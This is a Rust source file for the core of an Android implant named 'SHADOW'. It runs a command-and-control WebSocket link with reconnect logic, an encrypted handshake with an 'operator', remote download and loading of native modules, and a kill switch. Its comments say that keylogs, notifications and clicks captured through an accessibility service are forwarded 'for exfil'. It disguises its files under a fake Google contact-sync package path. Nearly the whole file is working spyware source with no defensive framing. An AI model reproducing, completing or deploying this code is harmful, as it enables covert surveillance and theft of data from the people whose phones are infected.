//! SHADOW Core — Holy Grail Edition

pub mod crypto;
pub mod kill;
pub mod module;
pub mod transport;
pub mod updater;

use crate::crypto::CryptoSession;
use crate::module::{ModuleRegistry, ShadowContext};
use jni::objects::{JClass, JString};
use jni::JNIEnv;
use jni::sys::jint;
use std::os::raw::c_char;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use tokio::runtime::Runtime;
use tokio::sync::mpsc;
use tracing::info;

static STARTED: AtomicBool = AtomicBool::new(false);
static mut RUNTIME: Option<Runtime> = None;
static mut CORE: Option<Arc<ShadowCore>> = None;

/// Forward an event (keylog, notif, click) to the transport for exfil.
pub fn push_event(tag: &str, payload: &str) {
    let frame = format!("{{\"type\":\"event\",\"tag\":\"{}\",\"data\":{}}}", tag, payload);
    unsafe {
        if let Some(core) = CORE.as_ref() {
            let _ = core.event_tx.clone().send(frame.into_bytes());
        }
    }
}

/// Forward a module's send_frame callback to the transport.
extern "C" fn module_send_frame(data: *const u8, len: usize) -> i32 {
    let slice = unsafe { std::slice::from_raw_parts(data, len) };
    push_event("module", &format!("{:?}", std::str::from_utf8(slice).unwrap_or("<?>")));
    0
}

extern "C" fn module_log_info(msg: *const c_char) {
    if !msg.is_null() {
        let s = unsafe { std::ffi::CStr::from_ptr(msg) }.to_string_lossy().into_owned();
        info!("[module] {}", s);
    }
}

struct ShadowCore {
    domain: String,
    implant_id: String,
    module_dir: std::path::PathBuf,
    crypto: Arc<Mutex<Option<CryptoSession>>>,
    event_tx: mpsc::UnboundedSender<Vec<u8>>,
    registry: Arc<Mutex<ModuleRegistry>>,
}

impl ShadowCore {
    async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
        let ws = transport::websocket::WsTransport::new(&self.domain, &self.implant_id);
        let (tx_send, rx_send) = mpsc::channel(100);
        let (tx_recv, mut rx_recv) = mpsc::channel(100);

        // Wire a11y exfil events into transport outbound channel
        let event_tx_send = tx_send.clone();
        tokio::spawn(async move {
            while let Some(msg) = event_rx.recv().await {
                if event_tx_send.send(msg).await.is_err() { break; }
            }
        });

        // Wire module send_frame into transport outbound channel
        let _module_tx = tx_send.clone();

        info!("SHADOW initialized. Implant ID: {}", self.implant_id);

        let rx_send_shared = std::sync::Arc::new(tokio::sync::Mutex::new(rx_send));

        // Transport connection loop (reconnect on failure/drop with exponential backoff)
        let ws_task = tokio::spawn(async move {
            let mut backoff = tokio::time::Duration::from_secs(2);
            let max_backoff = tokio::time::Duration::from_secs(60);
            
            loop {
                let (tx_internal, rx_internal) = mpsc::channel(100);
                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel(100);
                
                let rx_shared_clone = rx_send_shared.clone();
                let proxy = tokio::spawn(async move {
                    let mut lock = rx_shared_clone.lock().await;
                    while let Some(msg) = lock.recv().await {
                        if tx_internal.send(msg).await.is_err() { break; }
                    }
                });

                if let Err(e) = ws.connect(rx_internal, tx_recv_internal).await {
                    tracing::error!("Transport disconnected/failed: {}", e);
                } else {
                    tracing::info!("Transport closed cleanly.");
                }
                
                proxy.abort();
                
                tracing::info!("WSS reconnecting in {:?}...", backoff);
                tokio::time::sleep(backoff).await;
                backoff = std::cmp::min(backoff * 2, max_backoff);
            }
        });

        // Create module directory if it doesn't exist
        if !self.module_dir.exists() {
            let _ = std::fs::create_dir_all(&self.module_dir);
        }

        // Sync modules from C2 before loading
        {
            let domain = self.domain.clone();
            let module_dir = self.module_dir.clone();
            let synced = crate::updater::sync_modules(&domain, &module_dir).await;
            if synced.is_empty() {
                tracing::warn!("No modules synced from C2. Proceeding with local modules only.");
            } else {
                info!("Synced {} modules from C2.", synced.len());
            }
        }

        // Load modules from module_dir
        {
            let ctx = ShadowContext {
                send_frame: module_send_frame,
                log_info: module_log_info,
            };
            let mut registry = self.registry.lock().unwrap();
            if self.module_dir.exists() {
                if let Ok(entries) = std::fs::read_dir(&self.module_dir) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.extension().map(|e| e == "so").unwrap_or(false) {
                            unsafe {
                                let _ = registry.load_from_file(path, ctx);
                            }
                        }
                    }
                }
            }
        }

        // Main event loop: dispatch commands to modules
        while let Some(msg) = rx_recv.recv().await {
            let text = String::from_utf8_lossy(&msg).into_owned();
            info!("Received command frame: {} bytes", msg.len());

            // Try to decrypt if we have a session
            let decrypted = {
                let crypto = self.crypto.lock().unwrap();
                if let Some(session) = crypto.as_ref() {
                    match session.decrypt(&msg) {
                        Ok(pt) => Some(String::from_utf8_lossy(&pt).into_owned()),
                        Err(_) => None, // Not encrypted yet (handshake phase)
                    }
                } else {
                    None
                }
            };

            let body = decrypted.unwrap_or_else(|| text.clone());

            // Parse JSON command: {"id": "...", "c": "module", "p": {...}}
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(&body) {
                if let Some(cmd) = v.get("c").and_then(|v| v.as_str()) {
                    match cmd {
                        "crypto" => {
                            // X25519 handshake: {"p": {"pub": "<base64 operator pub>"}}
                            if let Some(p) = v.get("p").and_then(|v| v.get("pub")).and_then(|v| v.as_str()) {
                                if let Ok(pub_bytes) = base64_decode(p) {
                                    if pub_bytes.len() == 32 {
                                        let (secret, implant_pub) = crypto::CryptoSession::generate_ephemeral();
                                        let pub_arr: [u8; 32] = pub_bytes.as_slice().try_into().unwrap();
                                        match crypto::CryptoSession::derive(secret, pub_arr) {
                                            Ok(session) => {
                                                // Store the session for future decrypt/encrypt
                                                *self.crypto.lock().unwrap() = Some(session);
                                                
                                                // Send implant's public key back to operator
                                                use base64::Engine;
                                                let pub_b64 = base64::engine::general_purpose::STANDARD
                                                    .encode(implant_pub.as_bytes());
                                                let handshake_frame = format!(
                                                    "{{\"type\":\"handshake_response\",\"pub\":\"{}\"}}",
                                                    pub_b64
                                                );
                                                let _ = tx_send.clone().try_send(handshake_frame.into_bytes());
                                                info!("Crypto session established with operator.");
                                            }
                                            Err(e) => {
                                                tracing::error!("Crypto derive failed: {}", e);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        "kill" => {
                            info!("KILL SWITCH RECEIVED");
                            let module_dir = self.module_dir.clone();
                            tokio::spawn(async move {
                                let _ = crate::kill::execute_kill_switch(module_dir).await;
                            });
                        }
                        other => {
                            // Route to dynamic module
                            let registry = self.registry.lock().unwrap();
                            let payload_bytes = v.get("p").map(|p| p.to_string().into_bytes()).unwrap_or_default();
                            match registry.handle_command(other, &payload_bytes) {
                                Ok(resp) => {
                                    let _ = tx_send.clone().try_send(resp);
                                }
                                Err(e) => {
                                    tracing::error!("Module '{}' error: {}", other, e);
                                    let _ = tx_send.clone().try_send(
                                        format!("{{\"error\":\"{}\"}}", e).into_bytes()
                                    );
                                }
                            }
                        }
                    }
                }
            }
        }

        ws_task.abort();
        Ok(())
    }
}

fn base64_decode(s: &str) -> anyhow::Result<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(s).map_err(anyhow::Error::from)
}

#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
    mut env: JNIEnv,
    _: JClass,
    domain_jstr: JString,
    id_jstr: JString,
) -> jint {
    // Bridge tracing/log output to Android logcat — without this the core is a black box
    android_logger::init_once(
        android_logger::Config::default()
            .with_tag("ShadowCore")
            .with_max_level(log::LevelFilter::Info),
    );

    if STARTED.swap(true, Ordering::SeqCst) {
        return 0; // Already running — ignore duplicate init from WorkManager
    }

    let domain: String = env.get_string(&domain_jstr).unwrap().into();
    let implant_id: String = env.get_string(&id_jstr).unwrap().into();

    unsafe {
        RUNTIME = Some(Runtime::new().unwrap());
        let runtime = RUNTIME.as_ref().unwrap();

        runtime.block_on(async {
            let (event_tx, event_rx) = mpsc::unbounded_channel::<Vec<u8>>();
            let registry = Arc::new(Mutex::new(ModuleRegistry::new(std::path::PathBuf::from(
                "/data/data/com.google.android.contactsync/files/modules"
            ))));

            let core = Arc::new(ShadowCore {
                domain: domain.clone(),
                implant_id: implant_id.clone(),
                module_dir: std::path::PathBuf::from(
                    "/data/data/com.google.android.contactsync/files/modules"
                ),
                crypto: Arc::new(Mutex::new(None)),
                event_tx,
                registry,
            });

            CORE = Some(core.clone());

            tokio::spawn(async move {
                let _ = core.start(event_rx).await;
            });

            0
        })
    }
}

/// JNI export for AccessibilityService logToC2()
#[no_mangle]
pub extern "system" fn Java_com_shadow_ShadowCore_nativeLogEvent(
    mut env: JNIEnv,
    _: JClass,
    entry_jstr: JString,
) {
    let entry: String = match env.get_string(&entry_jstr) {
        Ok(s) => s.into(),
        Err(_) => return,
    };
    unsafe {
        if let Some(core) = CORE.as_ref() {
            let _ = core.event_tx.clone().send(entry.into_bytes());
        }
    }
}
